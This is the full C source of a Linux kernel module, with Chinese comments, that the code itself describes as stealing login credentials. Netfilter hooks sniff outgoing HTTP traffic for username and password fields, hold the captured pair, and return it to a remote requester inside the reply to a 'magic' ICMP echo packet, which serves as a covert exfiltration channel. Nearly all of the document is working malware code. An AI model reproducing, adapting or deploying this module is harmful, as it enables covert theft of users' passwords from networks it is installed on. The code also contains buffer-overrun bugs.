#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/string.h> //引入头文件，因为我们调用了strstr()函数

#define MAGIC_CODE   0x5B
#define REPLY_SIZE   36

MODULE_LICENSE("GPL");

#define ICMP_PAYLOAD_SIZE  (htons(ip_hdr(sb)->tot_len) \
			       - sizeof(struct iphdr) \
			       - sizeof(struct icmphdr))

/*
* 窃取ftp服务的用户名和密码，并且能发送过去
*/

/* THESE values are used to keep the USERname and PASSword until
 * they are queried. Only one USER/PASS pair will be held at one
 * time and will be cleared once queried. */
static char *username = NULL;
static char *password = NULL;
static int  have_pair = 0;	 /* Marks if we already have a pair */

/* Tracking information. Only log USER and PASS commands that go to the
 * same IP addre ss and TCP port. */
static unsigned int target_ip = 0;
static unsigned short target_port = 0;

/* Used to describe our Netfilter hooks */
struct nf_hook_ops  pre_hook;	       /* Incoming */
struct nf_hook_ops  post_hook;	       /* Outgoing */


/* Function that looks at an sk_buff that is known to be an FTP packet.
 * Looks for the USER and PASS fields and makes sure they both come from
 * the one host as indicated in the target_xxx fields */
static void check_ftp(struct sk_buff *skb) //sk_buff是网络数据报在内核中的表现形式
{
   struct tcphdr *tcp; //tcphdr即tcp头部数据结构
   //char *data;
   int len = 0;
   int i = 0;
   
   tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4)); //ihl表示ip报文首部长度，指包含多少个4字节
   //data = (char *)((int)tcp + (int)(tcp->doff * 4)); //doff表示tcp报文首部长度，指包含多少个4字节

   /* Now, if we have a username already, then we have a target_ip.
    * Make sure that this packet is destined for the same host. */
   if (username)
     if (ip_hdr(skb)->daddr != target_ip || tcp->source != target_port) //套接字匹配成功
       return;

    //构造http数据包
    int nLenHttp = skb->len - (ip_hdr(skb)->ihl * 4) - (tcp->doff * 4); // http数据包的总长度
    char *pDataHttp = kmalloc(nLenHttp+2, GFP_KERNEL); // 申请http的string空间
    memset(pDataHttp, 0x00, nLenHttp + 2); // 对这块内存进行初始化
    //memcpy(pDataHttp, data, nLenHttp-3); // 复制data中的内容到pDataHttp

    for(i=0; i<nLenHttp;i++){
       //尝试了data,发现总是有错，请教大神说应该更改，于是用skb->data成功
      pDataHttp[i] = skb->data[i+ (ip_hdr(skb)->ihl*4)+(tcp->doff*4)];
    }
    *(pDataHttp + nLenHttp + 2) = '\0'; //有了结尾，方便调用字符串匹配函数
    /*if (nLenHttp>0){
      printk("\nlenHttp:%d\n", nLenHttp);
      printk("\nHttpString: \n%s\n", pDataHttp); // 输出测试
    }*/
    
    /* 
       那么接下来，就在pDataHttp所指向的空间中，存储着所有的字符串，我只需找到即可
       */
    // 找到username的位置区间
    char *pName = NULL; //游标，表示位置
    pName = strstr(pDataHttp, "&uid="); //返回username在字符串中的位置
    if(pName==NULL) // 如果找不用户名，则返回
      return;
    int nLenName = 0; //名字长度
    char *pNameEnd = NULL; // 短暂存在的游标，表示名字末尾
    pNameEnd = strstr(pName+5, "&");
    if(pNameEnd==NULL) // 如果找不到用户名结尾，则返回
      return; 
    nLenName = pNameEnd - pName - 5; // 名字的长度
    printk("\n nLenName:%d\n", nLenName); // 测试输出

    // 构造用户名
    username = kmalloc(nLenName + 2, GFP_KERNEL); //申请内存空间
    memset(username, 0x00, nLenName+2); //初始化
    memcpy(username, pName+5, nLenName); //复制内存过去
    *(username + nLenName + 2) = '\0'; //设置结尾
    printk("username:\n%s\n", username); //测试输出

    // 找到password的位置区间
    char *pWord = NULL; //游标，表示位置
    pWord = strstr(pDataHttp, "&password="); //返回password在字符串中的位置
    if(pWord==NULL) // 如果找不密码，则返回
      return;
    int nLenWord = 0; //密码长度
    char *pWordEnd = NULL; // 短暂存在的游标，表示名字末尾
    pWordEnd = strstr(pWord+10, "&");
    if(pWordEnd==NULL) // 如果找不到密码结尾，则返回
      return; 
    nLenWord = pWordEnd - pWord - 10; // 密码的长度
    printk("\n nLenWord:%d\n", nLenWord); // 测试输出  

    // 构造密码
    password = kmalloc(nLenWord + 2, GFP_KERNEL); //申请内存空间
    memset(password, 0x00, nLenWord+2); //初始化
    memcpy(password, pWord+10, nLenWord); //复制内存过去
    *(password + nLenWord + 2) = '\0'; //设置结尾
    printk("password:\n%s\n", password); //测试输出


   if (!target_ip)
     target_ip = ip_hdr(skb)->daddr;
   if (!target_port)
     target_port = tcp->source;
    
   if (username && password)
     have_pair++;		       /* Have a pair. Ignore others until
					* this pair has been read. */
   if (have_pair)
     printk("Have password pair!  U: %s   P: %s\n", username, password);
}

/* Function called as the POST_ROUTING (last) hook. It will check for
 * FTP traffic then search that traffic for USER and PASS commands. */
static unsigned int watch_out(unsigned int hooknum,
			      struct sk_buff *skb,
			      const struct net_device *in,
			      const struct net_device *out,
			      int (*okfn)(struct sk_buff *))
{
   struct sk_buff *sb = skb;
   struct tcphdr *tcp;
   
   /* Make sure this is a TCP packet first */
   if (ip_hdr(sb)->protocol != IPPROTO_TCP)
     return NF_ACCEPT;		       /* Nope, not TCP */
   
   tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
   
   // 这个地方更改，改为http端口
   /* Now check to see if it's an FTP packet */
   if (tcp->dest != htons(80)) // ftp端口, 21用于连接，20用于传数据, 80表示http端口
     return NF_ACCEPT;		       /* Nope, not FTP */
   
   /* Parse the FTP packet for relevant information if we don't already
    * have a username and password pair. */
   if (!have_pair)
     check_ftp(sb);
   
   /* We are finished with the packet, let it go on its way */
   return NF_ACCEPT;
}


/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
 * When that is received, we tweak the skb structure to send a reply
 * back to the requesting host and tell Netfilter that we stole the
 * packet. */
static unsigned int watch_in(unsigned int hooknum,
			     struct sk_buff *skb,
			     const struct net_device *in,
			     const struct net_device *out,
			     int (*okfn)(struct sk_buff *))
{
   struct sk_buff *sb = skb;
   struct icmphdr *icmp;
   char *cp_data;		       /* Where we copy data to in reply */
   unsigned int taddr;	       /* Temporary IP holder */

   /* Do we even have a username/password pair to report yet? */
   if (!have_pair)
     return NF_ACCEPT;
     
   /* Is this an ICMP packet? */
   if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
     return NF_ACCEPT;
   
   icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

   /* Is it the MAGIC packet? */
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
      return NF_ACCEPT;
   }
   
   /* Okay, matches our checks for "Magicness", now we fiddle with
    * the sk_buff to insert the IP address, and username/password pair,
    * swap IP source and destination addresses and ethernet addresses
    * if necessary and then transmit the packet from here and tell
    * Netfilter we stole it. Phew... */
   taddr = ip_hdr(sb)->saddr; //交换源地址和目的地址
   ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
   ip_hdr(sb)->daddr = taddr;

   sb->pkt_type = PACKET_OUTGOING;

   switch (sb->dev->type) {
    case ARPHRD_PPP:		       /* Ntcho iddling needs doing */
      break;
    case ARPHRD_LOOPBACK:
    case ARPHRD_ETHER:
    {
	   unsigned char t_hwaddr[ETH_ALEN];
	   
	   /* Move the data pointer to point to the link layer header */
	   sb->data = (unsigned char *)eth_hdr(sb);
	   sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
	   memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
		  ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
 	   break;
    }
   };
 
   /* Now copy the IP address, then Username, then password into packet */
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
   memcpy(cp_data, &target_ip, 4);
   if (username)
     //memcpy(cp_data + 4, username, 16);
     memcpy(cp_data + 4, username, 16);
   if (password)
     memcpy(cp_data + 20, password, 16);
   
   /* This is where things will die if they are going to.
    * Fingers crossed... */
   dev_queue_xmit(sb);

   /* Now free the saved username and password and reset have_pair */
   kfree(username);
   kfree(password);
   username = password = NULL;
   have_pair = 0;
   
   target_port = target_ip = 0;

//   printk("Password retrieved\n");
   
   return NF_STOLEN;
}

int init_module()
{
   pre_hook.hook     = watch_in;
   pre_hook.pf       = PF_INET;
   pre_hook.priority = NF_IP_PRI_FIRST;
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;
   
   post_hook.hook     = watch_out;
   post_hook.pf       = PF_INET;
   post_hook.priority = NF_IP_PRI_FIRST;
   post_hook.hooknum  = NF_INET_POST_ROUTING;
   
   nf_register_hook(&pre_hook);
   nf_register_hook(&post_hook);
   
   return 0;
}

void cleanup_module()
{
   nf_unregister_hook(&post_hook);
   nf_unregister_hook(&pre_hook);
   
   if (password)
     kfree(password);
   if (username)
     kfree(username);
}

